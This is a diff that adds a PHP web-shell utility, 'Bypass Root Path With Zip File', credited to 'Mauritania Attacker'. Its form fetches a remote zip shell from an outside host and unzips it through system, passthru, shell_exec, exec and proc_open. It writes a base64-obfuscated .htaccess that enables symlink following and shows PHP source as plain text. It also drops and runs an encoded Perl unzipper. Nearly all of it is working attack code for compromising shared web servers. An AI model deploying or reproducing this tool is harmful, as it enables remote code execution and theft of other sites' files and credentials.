@@ -1,0 +1,84 @@
+<center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Root Path With Zip File</span><br>Coded By Mauritania Attacker</center>
+<p align='center'><img border='0' src='http://4.bp.blogspot.com/-B2RRd3iYCgI/Uj6UtLxxApI/AAAAAAAAATc/DJHEPAWNTmk/s320/Password-protected-zip-file.png'></p>
+<div class="tul"><font color="009900" face="Impact, Geneva, sans-serif" style="font-size: 8pt"><font/>
+
+<center><font face='ghost' color='red' size='5'><font/>
+<form method='post'>
+<input type='submit' value='Grab To Root Now' name='fuck'><br>
+<center><font color='red' size='4' face='ghost'>Remote Zip File</font><input type='text' size='40' name='shell' value='http://hcp1.es/wp-content/uploads/v4.zip'> </center>
+</form>
+</p>
+
+<?php
+@error_reporting(0);
+
+$file = $_POST['shell'];
+//Generate zip file
+mkdir('wooooot', 0755);
+chdir('wooooot');
+$fopen = fopen("v4.zip",'w');
+$shell = @file_get_contents($file);
+$swrite = fwrite($fopen ,$shell);
+if($swrite){
+echo "Zip File Downloaded Successfully\n";
+sleep(2);
+echo "<p>Going To Unzip the File to Get r00t....</p>\n";
+
+sleep(2); 
+
+//system
+system('unzip v4.zip');
+
+
+
+//passthru
+passthru('unzip v4.zip');
+
+
+//shell_exec
+shell_exec('unzip v4.zip');
+
+
+//exec
+exec('unzip v4.zip');
+
+
+
+//proc_open
+proc_open('unzip v4.zip');
+
+
+sleep(1);
+
+//Extracting htaccess For Symlink
+chdir('wooooot');
+$htaccess = 'T1BUSU9OUyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzIFN5bUxpbmtzSWZPd25lck1hdGNoIEluY2x1ZGVzIEluY2x1ZGVzTk9FWEVDIEV4ZWNDR0kNCk9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcw0KRm9yY2VUeXBlIHRleHQvcGxhaW4NCkFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIA0KQWRkVHlwZSB0ZXh0L3BsYWluIC5odG1sDQpBZGRUeXBlIHRleHQvaHRtbCAuc2h0bWwNCkFkZFR5cGUgdHh0IC5waHANCkFkZEhhbmRsZXIgc2VydmVyLXBhcnNlZCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAuaHRtbA0KQWRkSGFuZGxlciB0eHQgLnNodG1sDQpPcHRpb25zIEFsbA0KT3B0aW9ucyBBbGw=';
+$priv8priv = fopen(".htaccess" ,"w+");
+$xwrite = fwrite ($priv8priv ,base64_decode($htaccess));
+
+sleep(1);
+
+echo "<p>Loading Perl unzipper.... \!/ \n</p>";
+//dezipper.pl generate
+chdir('wooooot');
+$l0vercodee = 'eyANCnN5c3RlbSgidW56aXAgdjQuemlwIik7DQpleGVjKCJ1bnppcCB2NC56aXAiKTsNCnBhc3N0aHJ1KCJ1bnppcCB2NC56aXAiKTsNCnNoZWxsX2V4ZWMoInVuemlwIHY0LnppcCIpOw0KcHJvY19vcGVuKCJ1bnppcCB2NC56aXAiKTsNCn0=';
+$greatshiit = fopen("dezipper.pl" ,"w+");
+$write = fwrite ($greatshiit ,base64_decode($l0vercodee));
+if($write){
+echo "<p>Perl Unzipper Downloaded Successfully</p>\n";
+fclose($greatshiit);
+chmod("dezipper.pl",0755);
+
+echo "<p>Unzipping File with Perl \!/ </p>\n";
+
+system('perl dezipper.pl');
+passthru('perl dezipper.pl');
+shell_exec('perl dezipper.pl');
+exec('perl dezipper.pl');
+proc_open('perl dezipper.pl');
+
+echo"<br><a href=wooooot/1.txt TARGET='_blank'>Link=====><font color=red size=3 face='Courier New'><b>Root Path</b></font></a>";
+
+}
+}
+?>
